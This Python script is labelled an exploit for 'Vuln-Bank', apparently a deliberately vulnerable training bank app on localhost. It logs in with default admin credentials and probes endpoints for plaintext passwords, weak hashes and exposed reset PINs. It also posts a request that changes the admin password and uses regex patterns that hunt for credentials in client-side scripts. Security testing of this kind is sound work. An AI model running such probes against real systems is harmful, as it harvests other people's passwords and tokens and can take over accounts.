#!/usr/bin/env python3
"""
Plaintext Password Storage Exploit for Vuln-Bank

This script demonstrates how to exploit plaintext password storage vulnerabilities
in the Vuln-Bank application through dynamic testing of various endpoints.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import re
import hashlib
import time
from urllib.parse import urljoin
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import base64
import sqlite3
import os
import tempfile

# Initialize colorama for colored output
init()

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"{Fore.BLUE}[*] Logging in as {username}...{Style.RESET_ALL}")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"{Fore.GREEN}[+] Login successful! Got valid JWT token.{Style.RESET_ALL}")
                return (token, data)
            else:
                print(f"{Fore.RED}[-] Login successful but no token received.{Style.RESET_ALL}")
                return (None, None)
        else:
            print(f"{Fore.RED}[-] Login failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return (None, None)
    except Exception as e:
        print(f"{Fore.RED}[-] Error during login: {str(e)}{Style.RESET_ALL}")
        return (None, None)

def test_plaintext_password_in_api_responses(base_url, token=None):
    """
    Test for plaintext passwords in API responses
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Dictionary of endpoints with exposed passwords
    """
    print(f"\n{Fore.BLUE}[*] Testing for plaintext passwords in API responses...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        {"url": "/api/users", "method": "GET"},
        {"url": "/api/users/1", "method": "GET"},
        {"url": "/api/profile", "method": "GET"},
        {"url": "/api/users/search", "method": "POST", "data": {"search_term": "admin"}},
        {"url": "/api/users/create", "method": "POST", "data": {"username": "testuser", "password": "testpassword", "email": "test@example.com"}},
        {"url": "/api/users/update", "method": "POST", "data": {"username": "admin", "password": "newpassword"}}
    ]
    
    # Define patterns for passwords
    password_patterns = [
        r"\"password\":\s*\"[^\"]+\"",
        r"\"passwd\":\s*\"[^\"]+\"",
        r"\"pass\":\s*\"[^\"]+\"",
        r"\"pwd\":\s*\"[^\"]+\""
    ]
    
    findings = {}
    
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint["url"])
        method = endpoint["method"]
        data = endpoint.get("data")
        
        print(f"{Fore.BLUE}[*] Testing {method} {url}{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:  # POST
                response = requests.post(url, headers=headers, json=data, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for passwords in the response
            exposed_passwords = []
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check for passwords
                for pattern in password_patterns:
                    matches = re.finditer(pattern, resp_str)
                    for match in matches:
                        password_field = match.group(0)
                        exposed_passwords.append(password_field)
                        print(f"{Fore.RED}[-] Found exposed password: {password_field}{Style.RESET_ALL}")
                
                # If we found passwords, add to findings
                if exposed_passwords:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_passwords": exposed_passwords,
                        "response": resp_data
                    }
            else:
                # For non-JSON responses, check the raw text
                for pattern in password_patterns:
                    matches = re.finditer(pattern, resp_data)
                    for match in matches:
                        password_field = match.group(0)
                        exposed_passwords.append(password_field)
                        print(f"{Fore.RED}[-] Found exposed password: {password_field}{Style.RESET_ALL}")
                
                if exposed_passwords:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_passwords": exposed_passwords,
                        "response": "Non-JSON response with passwords"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint['url']}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_weak_password_hashing(base_url, token=None):
    """
    Test for weak password hashing by analyzing hash patterns
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Dictionary of findings related to weak password hashing
    """
    print(f"\n{Fore.BLUE}[*] Testing for weak password hashing...{Style.RESET_ALL}")
    
    # Define endpoints that might return password hashes
    endpoints = [
        {"url": "/api/users", "method": "GET"},
        {"url": "/api/users/1", "method": "GET"},
        {"url": "/api/profile", "method": "GET"}
    ]
    
    # Define patterns for common hash formats
    hash_patterns = {
        "MD5": r"\b[a-f0-9]{32}\b",
        "SHA1": r"\b[a-f0-9]{40}\b",
        "SHA256": r"\b[a-f0-9]{64}\b",
        "SHA512": r"\b[a-f0-9]{128}\b",
        "BCrypt": r"\$2[ayb]\$[0-9]{2}\$[./A-Za-z0-9]{53}",
        "Argon2": r"\$argon2[id]\$v=19\$m=[0-9]+,t=[0-9]+,p=[0-9]+\$[A-Za-z0-9+/]+\$[A-Za-z0-9+/]+"
    }
    
    findings = {}
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint["url"])
        method = endpoint["method"]
        
        print(f"{Fore.BLUE}[*] Testing {method} {url} for password hash patterns...{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:  # POST
                response = requests.post(url, headers=headers, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for hash patterns in the response
            found_hashes = {}
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check for each hash pattern
                for hash_type, pattern in hash_patterns.items():
                    matches = re.finditer(pattern, resp_str)
                    for match in matches:
                        hash_value = match.group(0)
                        if hash_type not in found_hashes:
                            found_hashes[hash_type] = []
                        found_hashes[hash_type].append(hash_value)
                        print(f"{Fore.YELLOW}[!] Found potential {hash_type} hash: {hash_value}{Style.RESET_ALL}")
                
                # If we found hashes, add to findings
                if found_hashes:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "found_hashes": found_hashes,
                        "response": resp_data
                    }
            else:
                # For non-JSON responses, check the raw text
                for hash_type, pattern in hash_patterns.items():
                    matches = re.finditer(pattern, resp_data)
                    for match in matches:
                        hash_value = match.group(0)
                        if hash_type not in found_hashes:
                            found_hashes[hash_type] = []
                        found_hashes[hash_type].append(hash_value)
                        print(f"{Fore.YELLOW}[!] Found potential {hash_type} hash: {hash_value}{Style.RESET_ALL}")
                
                if found_hashes:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "found_hashes": found_hashes,
                        "response": "Non-JSON response with hash patterns"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint['url']}: {str(e)}{Style.RESET_ALL}")
    
    # Analyze the findings to determine if weak hashing is used
    if findings:
        print(f"\n{Fore.BLUE}[*] Analyzing hash patterns...{Style.RESET_ALL}")
        
        # Count the occurrences of each hash type
        hash_counts = {}
        for endpoint_url, methods in findings.items():
            for method, data in methods.items():
                for hash_type, hashes in data.get("found_hashes", {}).items():
                    if hash_type not in hash_counts:
                        hash_counts[hash_type] = 0
                    hash_counts[hash_type] += len(hashes)
        
        # Determine the likely hashing algorithm based on frequency
        if hash_counts:
            most_common_hash = max(hash_counts.items(), key=lambda x: x[1])
            print(f"{Fore.YELLOW}[!] Most common hash pattern: {most_common_hash[0]} ({most_common_hash[1]} occurrences){Style.RESET_ALL}")
            
            # Assess the strength of the hashing algorithm
            weak_hashes = ["MD5", "SHA1"]
            if most_common_hash[0] in weak_hashes:
                print(f"{Fore.RED}[-] Weak password hashing detected: {most_common_hash[0]}{Style.RESET_ALL}")
                print(f"{Fore.RED}[-] {most_common_hash[0]} is vulnerable to rainbow table attacks and is not suitable for password storage.{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] Stronger password hashing detected: {most_common_hash[0]}{Style.RESET_ALL}")
                if most_common_hash[0] == "SHA256" or most_common_hash[0] == "SHA512":
                    print(f"{Fore.YELLOW}[!] {most_common_hash[0]} is stronger than MD5/SHA1 but still not ideal for password storage without proper salting.{Style.RESET_ALL}")
    
    return findings

def test_password_reset_mechanism(base_url):
    """
    Test for insecure password reset mechanism
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of findings related to insecure password reset
    """
    print(f"\n{Fore.BLUE}[*] Testing for insecure password reset mechanism...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        {"url": "/api/reset-password", "method": "POST", "data": {"email": "admin@vuln-bank.example.com"}},
        {"url": "/api/reset-password/verify", "method": "POST", "data": {"email": "admin@vuln-bank.example.com", "pin": "123"}}
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint["url"])
        method = endpoint["method"]
        data = endpoint.get("data")
        
        print(f"{Fore.BLUE}[*] Testing {method} {url}{Style.RESET_ALL}")
        
        try:
            response = requests.post(url, json=data, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for insecure password reset patterns
            insecure_patterns = []
            
            if is_json:
                # Convert JSON to string for analysis
                resp_str = json.dumps(resp_data)
                
                # Check for PIN in response
                pin_match = re.search(r"\"pin\":\s*\"(\d+)\"", resp_str)
                if pin_match:
                    pin = pin_match.group(1)
                    insecure_patterns.append(f"PIN exposed in response: {pin}")
                    print(f"{Fore.RED}[-] Password reset PIN exposed in response: {pin}{Style.RESET_ALL}")
                
                # Check for short PIN
                pin_length_match = re.search(r"\"pin\":\s*\"(\d{1,4})\"", resp_str)
                if pin_length_match:
                    pin = pin_length_match.group(1)
                    insecure_patterns.append(f"Short PIN ({len(pin)} digits): {pin}")
                    print(f"{Fore.RED}[-] Short password reset PIN detected ({len(pin)} digits): {pin}{Style.RESET_ALL}")
                
                # Check for token in URL
                token_url_match = re.search(r"\"reset_url\":\s*\"[^\"]*token=([^\"&]+)\"", resp_str)
                if token_url_match:
                    token = token_url_match.group(1)
                    insecure_patterns.append(f"Reset token in URL: {token}")
                    print(f"{Fore.RED}[-] Password reset token exposed in URL: {token}{Style.RESET_ALL}")
                
                # If we found insecure patterns, add to findings
                if insecure_patterns:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "insecure_patterns": insecure_patterns,
                        "response": resp_data
                    }
            else:
                # For non-JSON responses, check the raw text
                # Check for PIN in response
                pin_match = re.search(r"PIN:\s*(\d+)", resp_data)
                if pin_match:
                    pin = pin_match.group(1)
                    insecure_patterns.append(f"PIN exposed in response: {pin}")
                    print(f"{Fore.RED}[-] Password reset PIN exposed in response: {pin}{Style.RESET_ALL}")
                
                # Check for token in URL
                token_url_match = re.search(r"href=['\"][^'\"]*token=([^'\"&]+)['\"]", resp_data)
                if token_url_match:
                    token = token_url_match.group(1)
                    insecure_patterns.append(f"Reset token in URL: {token}")
                    print(f"{Fore.RED}[-] Password reset token exposed in URL: {token}{Style.RESET_ALL}")
                
                if insecure_patterns:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "insecure_patterns": insecure_patterns,
                        "response": "Non-JSON response with insecure reset patterns"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint['url']}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_remember_me_functionality(base_url):
    """
    Test for insecure "Remember Me" functionality
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of findings related to insecure "Remember Me" functionality
    """
    print(f"\n{Fore.BLUE}[*] Testing for insecure \"Remember Me\" functionality...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Note: This test requires manual verification in a browser.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Check the following JavaScript code for insecure credential storage:{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/",
        "/login"
    ]
    
    # Define patterns for insecure "Remember Me" functionality
    remember_me_patterns = [
        r"localStorage\.setItem\(['\"](?:remember_me|credentials|auth|user|password)['\"],\s*([^)]+)\)",
        r"localStorage\[['\"](?:remember_me|credentials|auth|user|password)['\"]\]\s*=\s*([^;]+)",
        r"document\.cookie\s*=\s*['\"](?:remember_me|credentials|auth|user|password)=([^'\"]+)['\"]"
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing {url} for insecure \"Remember Me\" functionality...{Style.RESET_ALL}")
        
        try:
            response = requests.get(url, timeout=5)
            
            # Check if response is HTML
            if "text/html" in response.headers.get("Content-Type", ""):
                html_content = response.text
                
                # Parse HTML
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Find all script tags
                scripts = soup.find_all('script')
                
                # Look for insecure "Remember Me" functionality in inline scripts
                insecure_patterns = []
                
                for script in scripts:
                    if script.string:  # Only process inline scripts
                        script_text = script.string
                        for pattern in remember_me_patterns:
                            matches = re.finditer(pattern, script_text)
                            for match in matches:
                                context = match.group(0)
                                insecure_patterns.append(context)
                                print(f"{Fore.RED}[-] Found insecure \"Remember Me\" functionality: {context}{Style.RESET_ALL}")
                
                # Find all external script sources
                script_srcs = [script.get('src') for script in scripts if script.get('src')]
                
                # Check each external script
                for src in script_srcs:
                    if src.startswith(('http://', 'https://')):
                        script_url = src
                    else:
                        script_url = urljoin(base_url, src)
                    
                    print(f"{Fore.BLUE}[*] Checking external script: {script_url}{Style.RESET_ALL}")
                    
                    try:
                        script_response = requests.get(script_url, timeout=5)
                        script_text = script_response.text
                        
                        for pattern in remember_me_patterns:
                            matches = re.finditer(pattern, script_text)
                            for match in matches:
                                context = match.group(0)
                                insecure_patterns.append(f"{src}: {context}")
                                print(f"{Fore.RED}[-] Found insecure \"Remember Me\" functionality in {src}: {context}{Style.RESET_ALL}")
                    
                    except requests.exceptions.RequestException as e:
                        print(f"{Fore.RED}[-] Error fetching external script {src}: {str(e)}{Style.RESET_ALL}")
                
                if insecure_patterns:
                    # Add to findings
                    findings[endpoint] = {
                        "insecure_patterns": insecure_patterns
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_hardcoded_credentials(base_url):
    """
    Test for hardcoded credentials in client-side code
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of findings related to hardcoded credentials
    """
    print(f"\n{Fore.BLUE}[*] Testing for hardcoded credentials in client-side code...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/",
        "/login",
        "/dashboard",
        "/admin"
    ]
    
    # Define patterns for hardcoded credentials
    credential_patterns = [
        r"(?:username|user|login|admin)[\s]*[=:][\s]*['\"]([^'\"]+)['\"]",
        r"(?:password|passwd|pwd|pass)[\s]*[=:][\s]*['\"]([^'\"]+)['\"]",
        r"(?:apiKey|api_key|apikey|token|secret)[\s]*[=:][\s]*['\"]([^'\"]+)['\"]",
        r"const\s+(?:USERNAME|USER|LOGIN|ADMIN)\s*=\s*['\"]([^'\"]+)['\"]",
        r"const\s+(?:PASSWORD|PASSWD|PWD|PASS)\s*=\s*['\"]([^'\"]+)['\"]",
        r"const\s+(?:API_KEY|APIKEY|TOKEN|SECRET)\s*=\s*['\"]([^'\"]+)['\"]"
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing {url} for hardcoded credentials...{Style.RESET_ALL}")
        
        try:
            response = requests.get(url, timeout=5)
            
            # Check if response is HTML
            if "text/html" in response.headers.get("Content-Type", ""):
                html_content = response.text
                
                # Parse HTML
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Find all script tags
                scripts = soup.find_all('script')
                
                # Look for hardcoded credentials in inline scripts
                hardcoded_credentials = []
                
                for script in scripts:
                    if script.string:  # Only process inline scripts
                        script_text = script.string
                        for pattern in credential_patterns:
                            matches = re.finditer(pattern, script_text)
                            for match in matches:
                                credential = match.group(0)
                                hardcoded_credentials.append(credential)
                                print(f"{Fore.RED}[-] Found hardcoded credential: {credential}{Style.RESET_ALL}")
                
                # Find all external script sources
                script_srcs = [script.get('src') for script in scripts if script.get('src')]
                
                # Check each external script
                for src in script_srcs:
                    if src.startswith(('http://', 'https://')):
                        script_url = src
                    else:
                        script_url = urljoin(base_url, src)
                    
                    print(f"{Fore.BLUE}[*] Checking external script: {script_url}{Style.RESET_ALL}")
                    
                    try:
                        script_response = requests.get(script_url, timeout=5)
                        script_text = script_response.text
                        
                        for pattern in credential_patterns:
                            matches = re.finditer(pattern, script_text)
                            for match in matches:
                                credential = match.group(0)
                                hardcoded_credentials.append(f"{src}: {credential}")
                                print(f"{Fore.RED}[-] Found hardcoded credential in {src}: {credential}{Style.RESET_ALL}")
                    
                    except requests.exceptions.RequestException as e:
                        print(f"{Fore.RED}[-] Error fetching external script {src}: {str(e)}{Style.RESET_ALL}")
                
                if hardcoded_credentials:
                    # Add to findings
                    findings[endpoint] = {
                        "hardcoded_credentials": hardcoded_credentials
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def main():
    parser = argparse.ArgumentParser(description="Test for plaintext password storage in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    parser.add_argument("--username", default="admin", help="Username to use for login")
    parser.add_argument("--password", default="admin123", help="Password to use for login")
    args = parser.parse_args()
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Plaintext Password Storage Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {args.url}{Style.RESET_ALL}")
    
    # Login to get a token
    token, user_data = login(args.url, args.username, args.password)
    
    # Run tests
    api_findings = test_plaintext_password_in_api_responses(args.url, token)
    hash_findings = test_weak_password_hashing(args.url, token)
    reset_findings = test_password_reset_mechanism(args.url)
    remember_me_findings = test_remember_me_functionality(args.url)
    hardcoded_findings = test_hardcoded_credentials(args.url)
    
    # Summarize findings
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    
    total_findings = 0
    
    if api_findings:
        print(f"{Fore.RED}[-] Found plaintext passwords in API responses from {len(api_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(api_findings)
    
    if hash_findings:
        print(f"{Fore.RED}[-] Found evidence of weak password hashing in {len(hash_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(hash_findings)
    
    if reset_findings:
        print(f"{Fore.RED}[-] Found insecure password reset mechanism in {len(reset_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(reset_findings)
    
    if remember_me_findings:
        print(f"{Fore.RED}[-] Found insecure \"Remember Me\" functionality in {len(remember_me_findings)} pages{Style.RESET_ALL}")
        total_findings += len(remember_me_findings)
    
    if hardcoded_findings:
        print(f"{Fore.RED}[-] Found hardcoded credentials in {len(hardcoded_findings)} pages{Style.RESET_ALL}")
        total_findings += len(hardcoded_findings)
    
    if total_findings == 0:
        print(f"{Fore.GREEN}[+] No plaintext password storage vulnerabilities found{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Total findings: {total_findings} instances of plaintext password storage or related vulnerabilities{Style.RESET_ALL}")
    
    print(f"\n{Fore.BLUE}[*] Plaintext password storage testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
